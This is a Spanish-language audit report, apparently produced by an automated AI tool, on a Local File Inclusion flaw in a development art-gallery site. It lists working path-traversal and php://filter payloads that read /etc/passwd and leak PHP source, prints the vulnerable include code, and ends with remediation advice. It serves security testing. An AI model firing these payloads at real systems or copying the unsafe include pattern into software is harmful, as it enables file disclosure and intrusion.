# Informe de auditoría — LFI

Fecha: 2026-04-18T17:59:29Z
Objetivo: http://web.dev.local:8081 (Galería de Arte Virtual)

Resumen
-------
Vulnerabilidad: Local File Inclusion (LFI)
Resultado: Vulnerabilidad confirmada y explotada para lectura de archivos locales y obtención del código fuente PHP.

Evidencia y pruebas realizadas
------------------------------
1) Lectura de /etc/passwd
- Payload: /gallery.php?page=../../../../etc/passwd
- Resultado: Contenido de /etc/passwd devuelto (ejemplo):
  root:x:0:0:root:/root:/bin/bash
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

2) Obtención del código fuente de gallery.php usando php filter
- Payload: /gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php
- Resultado: Se obtuvo una cadena Base64 que decodificada reveló el código fuente de gallery.php. Fragmento relevante (decodificado):

<?php

$page = $_GET['page'] ?? 'modern';

?>
...
            if (strpos($page, '.') !== false) {
                // If it has an extension, use it as-is 
                $file = $page;
            } else {
                $file = "pages/" . $page . ".php";
            }

            if (file_exists($file)) {
                include($file);
            } else {
                echo "<div class='error'>";
                echo "<h3>Página no encontrada</h3>";
                echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
                echo "</div>";
                @include($file);
            }


3) Otros intentos
- Null byte (%00): /gallery.php?page=../../../../etc/passwd%00 -> bloqueado por la app (mensaje de no encontrado).
- /proc/self/environ: include falló por permisos, se observaron warnings en la respuesta indicando intento de include.

Impacto
-------
- Exposición de archivos sensibles del servidor (ej. /etc/passwd).
- Divulgación del código fuente PHP (posible filtrado de credenciales, rutas y lógica interna).
- Potencial para escalada a RCE si se logra incluir archivos que contengan código PHP (logs, uploads) y si se consigue escribir archivos con contenido PHP.

Recomendaciones
---------------
1) Validar y sanear el parámetro 'page' y aplicar whitelist (permitir solo valores esperados: "modern","classic","abstract","about").
2) Evitar incluir rutas suministradas por el usuario. Si es necesario, mapear nombres de página a rutas fijas en servidor.
3) Usar realpath() y comprobar que el fichero final está dentro del directorio permitido antes de incluir.
4) Eliminar el comportamiento de intentar incluir el archivo tras detectar error (@include). No incluir nunca entradas sin validar.
5) Establecer permisos restrictivos en archivos sensibles y deshabilitar allow_url_include en php.ini.
6) Registrar y alertar intentos de traversal e incluir medidas WAF/IPS.

Artefactos
----------
- /tmp/g_passwd1.html (respuesta de payload /etc/passwd)
- /tmp/g_b64.html (respuesta con Base64 embebido)
- /tmp/gallery_src.php (código fuente decodificado)

Conclusión
----------
Se confirma LFI en gallery.php via parámetro 'page'. Se explotó con éxito para leer /etc/passwd y recuperar el código fuente PHP usando php://filter. Se recomienda aplicar las mitigaciones anteriores con prioridad alta.

Analista: informe generado por herramienta automatizada (GPT-5 mini)
